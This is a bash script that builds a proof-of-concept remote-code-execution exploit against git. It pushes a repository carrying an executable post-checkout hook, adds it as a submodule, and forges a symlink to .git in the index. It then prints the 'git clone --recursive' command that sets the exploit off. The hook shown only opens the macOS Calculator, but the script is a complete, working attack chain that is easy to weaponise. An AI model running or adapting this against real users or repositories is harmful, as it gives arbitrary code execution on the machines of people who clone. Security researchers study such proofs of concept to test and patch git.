#!/bin/bash

# Define repository paths
HULK_REPO="git@github.com:safebuffer/hulk.git"
pullme_REPO="git@github.com:safebuffer/submod.git"

# Final Exploit Repo
SMASH_REPO="git@github.com:safebuffer/smash.git"

# Function to clone and set up the hook repository
setup_HULK_REPO() {
	# Remove existing directories
	rm -rf hulk*

	git clone "$HULK_REPO" hulk

	# Navigate to the hook repository
	cd hulk/ || exit

	# Create necessary directories and set up the post-checkout hook
	mkdir -p y/hooks
	cp ./.git/hooks/post-update.sample y/hooks/post-checkout # so u won't get the hook ignored
	echo "/System/Applications/Calculator.app/Contents/MacOS/Calculator" > y/hooks/post-checkout

	# Add and commit the post-checkout hook
	git add y/hooks/post-checkout
	git update-index --chmod=+x y/hooks/post-checkout
	git commit -m "Add executable post-checkout hook"

	# Push changes to the remote repository
	git push

	# Return to the parent directory
	cd ..
}

# Function to clone and set up the pullme repository with a submodule
setup_pullme_repo() {
	# Remove existing directories
	rm -rf pullme*

	# Clone the pullme repository
	git clone "$pullme_REPO" pullme

	# Navigate to the pullme repository
	cd pullme || exit

	# Clean up previous directories and remove submodule
	rm -rf a* A*
	git rm -r A/modules/x

	# Add the hook repository as a submodule
	git submodule add --name x/y "$HULK_REPO" A/modules/x
	git commit -m "Add submodule"

	# Create a symlink to the .git directory
	# Print the string ".git" to a file named dotgit.txt
	printf .git > dotgit.txt

	# Generate a hash for the contents of dotgit.txt and store it in dot-git.hash
	# The `-w` option writes the object to the object database, and the hash is output
	git hash-object -w --stdin < dotgit.txt > dot-git.hash

	# Create an index info line for a symbolic link with the mode 120000
	# The line is formatted as: "120000 <hash> 0\ta"
	# 120000 indicates a symbolic link, <hash> is the content hash, and 'a' is the path in the index
	printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info

	# Update the git index with the information from index.info
	# This effectively stages the symbolic link for the next commit
	git update-index --index-info < index.info

	# Commit the staged changes with a message "Add symlink"
	git commit -m "Add symlink"
	# Push changes to the remote repository
	git push

	# Return to the parent directory
	cd ..
}

# Function to clone the smash repository with submodules
show_command() {
  # Define color codes
  RED='\033[0;31m'
  GREEN='\033[0;32m'
  YELLOW='\033[0;33m'
  BLUE='\033[0;34m'
  NC='\033[0m' # No Color

  # Output the command with colors
  echo -e "${GREEN}Trigger the exploit with ${NC}:\n"
  echo -e "${YELLOW}git clone --recursive ${BLUE}$SMASH_REPO ${RED}GITRCE${NC}"
}

# Execute functions
setup_HULK_REPO
setup_pullme_repo
show_command
